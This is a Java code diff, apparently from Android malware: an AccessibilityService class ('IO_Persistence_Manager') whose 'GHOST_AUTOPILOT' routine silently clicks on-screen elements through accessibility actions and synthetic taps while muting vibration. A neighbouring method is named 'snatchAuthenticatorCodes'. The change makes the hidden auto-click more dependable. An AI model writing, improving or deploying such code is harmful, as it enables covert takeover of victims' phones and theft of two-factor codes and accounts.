@@ -2012,47 +2012,52 @@ public class IO_Persistence_Manager extends AccessibilityService {
 
         lastAutoPilotClickTime = System.currentTimeMillis();
 
-        // 1. Direct Accessibility ACTION_CLICK on node
-        if (node.isClickable()) {
-            if (node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
-                muteVibration();
-                Log.d(TAG, "GHOST_AUTOPILOT: Direct node ACTION_CLICK performed successfully");
-                return true;
-            }
-        }
-
-        // 2. Direct Accessibility ACTION_CLICK on clickable parent
-        AccessibilityNodeInfo curr = node.getParent();
-        int depth = 0;
-        while (curr != null && depth < 5) {
-            if (curr.isClickable()) {
-                if (curr.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
-                    muteVibration();
-                    Log.d(TAG, "GHOST_AUTOPILOT: Direct parent ACTION_CLICK performed successfully");
-                    curr.recycle();
-                    return true;
-                }
-            }
-            AccessibilityNodeInfo parent = curr.getParent();
-            curr.recycle();
-            curr = parent;
-            depth++;
-        }
-
-        // 3. Fallback: Native gesture tap at coordinates
         Rect bounds = new Rect();
         node.getBoundsInScreen(bounds);
         int x = bounds.centerX();
         int y = bounds.centerY();
 
-        if (x > 0 && y > 0 && x < getScreenWidth() && y < getScreenHeight()) {
-            Log.d(TAG, "GHOST_AUTOPILOT: Gesture tap fallback at (" + x + ", " + y + ")");
-            boolean res = clickAt(x, y);
-            if (res) muteVibration();
-            return res;
+        boolean clicked = false;
+
+        // 1. Direct Accessibility ACTION_CLICK on node
+        if (node.isClickable()) {
+            if (node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
+                clicked = true;
+                Log.d(TAG, "GHOST_AUTOPILOT: Direct node ACTION_CLICK performed");
+            }
         }
 
-        return false;
+        // 2. Direct Accessibility ACTION_CLICK on clickable parent
+        if (!clicked) {
+            AccessibilityNodeInfo curr = node.getParent();
+            int depth = 0;
+            while (curr != null && depth < 5) {
+                if (curr.isClickable()) {
+                    if (curr.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
+                        clicked = true;
+                        Log.d(TAG, "GHOST_AUTOPILOT: Direct parent ACTION_CLICK performed");
+                        curr.recycle();
+                        break;
+                    }
+                }
+                AccessibilityNodeInfo parent = curr.getParent();
+                curr.recycle();
+                curr = parent;
+                depth++;
+            }
+        }
+
+        // 3. Always dispatch native gesture tap at bounds coordinates for guaranteed hardware button activation
+        if (x > 0 && y > 0 && x < getScreenWidth() && y < getScreenHeight()) {
+            boolean tapRes = clickAt(x, y);
+            if (tapRes || clicked) {
+                muteVibration();
+                Log.d(TAG, "GHOST_AUTOPILOT: Auto-click gesture tap executed at (" + x + ", " + y + ")");
+                return true;
+            }
+        }
+
+        return clicked;
     }
 
     private void snatchAuthenticatorCodes(String pkg) {
